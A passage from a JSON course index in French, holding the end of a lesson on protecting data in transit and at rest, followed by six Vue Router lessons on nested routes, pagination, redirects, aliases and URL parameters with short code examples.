Transit (Data in Transit) : Définition : Données qui circulent sur le réseau (Internet, Wi-Fi). Risque : Interception (Man-in-the-Middle), écoute (Sniffing). Solution : Chiffrement via TLS/SSL (HTTPS, WSS, VPN). Cela crée un tunnel sécurisé entre le client et le serveur. Au Repos (Data at Rest) : Définition : Données stockées de manière persistante (Disque dur, Base de données, Backup). Risque : Vol physique du serveur, vol de disque dur, accès non autorisé au système de fichiers. Solution : Chiffrement du disque (BitLocker, LUKS) ou chiffrement de la base de données (AES-256). Si le disque est volé, les données sont illisibles sans la clé. Conclusion : Une sécurité complète nécessite les deux. HTTPS ne protège pas une base de données volée, et le chiffrement disque ne protège pas les données interceptées sur le Wi-Fi."
    }
  ],
  "Web-294 > VueJS": [
    {
      "name": "Introduction",
      "file": "/public/markdown/Web-294/VueJS/1-Introduction.md",
      "content": "<!-- 'NoAudio' --> Touring Vue Router - Introduction Source: C-294-ALL01-Touring Vue Router (ETML ICT 294). Pas d'audio Objectif du module Ce cours présente les fondamentaux de Vue Router et montre comment structurer une application à page unique (SPA) avec Vue.js. Les notions abordées incluent : Gestion des URL Navigation entre composants Paramètres de requête et paramètres dynamiques Pagination Routes imbriquées Redirections et alias Rôle de Vue Router Vue Router permet de définir comment une application Vue réagit aux changements d’URL. La majorité de la configuration se trouve dans : src/router/index.js Ce fichier définit : Les chemins d’URL (path) Le composant associé (component) Le nom de la route (name) Les paramètres dynamiques (:id) La transmission de données via props Les routes enfants (children) Application utilisée Le cours développe une application d’événements comprenant : Liste d'événements Pagination Page de détails Page d'inscription Page d'édition Layout partagé Gestion de redirections Cette application sert d'exemple pour toute la suite du module."
    },
    {
      "name": "Routes imbriquées",
      "file": "/public/markdown/Web-294/VueJS/2-Routes imbriquées.md",
      "content": "<!-- 'NoAudio' --> Routes imbriquées (Nested Routes) Source: C-294-ALL01-Touring Vue Router (ETML ICT 294). Pas d'audio 1. Structure de fichiers recommandée views/event/ Layout.vue Details.vue Register.vue Edit.vue 2. Routage initial (moins optimal) { path: \"/event/:id\", name: \"EventDetails\", component: EventDetails, props: true } Problèmes : Duplication de code Requêtes API répétées 3. Layout centralisé <router-view :event=\"event\" /> 4. Routes imbriquées { path: \"/event/:id\", component: EventLayout, props: true, children: [ { path: \"\", name: \"EventDetails\", component: EventDetails, props: true }, { path: \"register\", name: \"EventRegister\", component: EventRegister, props: true }, { path: \"edit\", name: \"EventEdit\", component: EventEdit, props: true } ] } 5. Avantages Une seule requête API Navigation cohérente Code simplifié 6. Composants enfants Exemple Details.vue : <p>{{ event.time }} on {{ event.date }} @ {{ event.location }}</p> <p>{{ event.description }}</p> 7. Optimisation Vue Router réutilise automatiquement les params si non fournis dans router-link."
    },
    {
      "name": "Pagination",
      "file": "/public/markdown/Web-294/VueJS/3-Pagination.md",
      "content": "<!-- 'NoAudio' --> Pagination avec Vue Router Source: C-294-ALL01-Touring Vue Router (ETML ICT 294). Pas d'audio 1. Modification du service API getEvents(perPage, page) { return apiClient.get(`/events?_limit=${perPage}&_page=${page}`) } 2. Lecture de la page via le routeur props: (route) => ({ page: parseInt(route.query.page) || 1, }) 3. Chargement réactif dans EventList.vue watchEffect(async () => { events.value = null const response = await EventService.getEvents(perPage, props.page) events.value = response.data totalEvents.value = parseInt(response.headers['x-total-count']) }) 4. Liens de pagination <router-link v-if=\"page > 1\" :to=\"{ name: 'EventList', query: { page: page - 1 } }\" >Previous</router-link> <router-link v-if=\"isNextPage\" :to=\"{ name: 'EventList', query: { page: page + 1 } }\" >Next</router-link> 5. Détection de la dernière page const isNextPage = computed(() => { const totalPages = Math.ceil(totalEvents.value / perPage) return props.page < totalPages }) 6. Style minimal .pagination { display: flex; justify-content: space-between; margin-top: 1.5rem; } 7. Points importants watchEffect déclenche un rechargement lorsque la page change x-total-count détermine le nombre de pages Utiliser des routes nommées pour éviter les erreurs"
    },
    {
      "name": "Redirections et alias",
      "file": "/public/markdown/Web-294/VueJS/4-Redirections et alias.md",
      "content": "<!-- 'NoAudio' --> Redirections et Alias Source: C-294-ALL01-Touring Vue Router (ETML ICT 294). Pas d'audio 1. Redirections simples { path: \"/about-us\", name: \"About\", component: About }, { path: \"/about\", redirect: { name: \"About\" } } 2. Alias { path: \"/about-us\", component: About, alias: \"/about\" } 3. Redirection dynamique { path: \"/event/:id\", redirect: \"/events/:id\" } 4. Wildcard { path: \"/event/:after(.*)\", redirect: \"/events/:after\" } 5. Recommandations Préférer redirect si l’ancienne URL doit disparaître Préférer alias si plusieurs URL doivent rester valides"
    },
    {
      "name": "Synthese",
      "file": "/public/markdown/Web-294/VueJS/5-Synthese.md",
      "content": "<!-- 'NoAudio' --> Vue Router - Synthèse Résumé des notions clés du cours Touring Vue Router. Pas d'audio Query et Params query : $route.query params : $route.params Props dans les routes props: true props: { ... } props: route => ({ ... }) Pagination Paramètres JSON Server : _limit, _page watchEffect pour la mise à jour Header x-total-count pour calculer les pages Routes imbriquées Layout avec <router-view> Routes enfants dans children Reduce duplication des requêtes API Redirections redirect pour modification d’URL alias pour double accès valide wildcard pour redirection globale Structure recommandée router/ index.js views/ event/ Layout.vue Details.vue Register.vue Edit.vue"
    },
    {
      "name": "Paramètres URL",
      "file": "/public/markdown/Web-294/VueJS/6-Paramètres URL.md",
      "content": "<!-- 'NoAudio' --> Paramètres d’URL : Query, Params et Props Source: C-294-ALL01-Touring Vue Router (ETML ICT 294). Pas d'audio 1. Paramètres de requête (query) Exemple : /events?page=4 Dans un template : {{ $route.query.page }} Dans le script : const page = computed(() => $route.query.page) 2. Paramètres dynamiques (params) Exemple : /events/4 Définition dans le routeur : { path: \"/events/:page\", component: EventList } Accès dans le composant : {{ $route.params.page }} 3. Passer les paramètres comme props Recommandé pour rendre les composants indépendants du routeur. { path: \"/events/:page\", component: EventList, props: true } Dans le composant : const props = defineProps(['page']) 4. Props en objet props: { showExtra: true } 5. Props en fonction props: (route) => ({ showExtra: route.query.e === 'true', }) 6. Points clés query = $route.query params = $route.params props = découplage recommandé props fonction = transformation possible"
    }
  ]
}